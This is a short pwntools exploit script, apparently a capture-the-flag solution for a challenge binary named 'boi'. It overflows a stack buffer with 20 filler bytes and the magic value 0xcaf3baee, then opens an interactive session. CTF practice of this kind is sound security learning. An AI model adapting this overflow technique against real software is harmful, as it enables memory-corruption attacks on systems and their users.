from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./boi")
# gdb.attach(p,"break *0x00000000004006a5")

flag = 0xcaf3baee

buf = ""
buf += "A" * 20
buf += p64(flag)

p.recvline()
p.sendline(buf)
p.interactive()
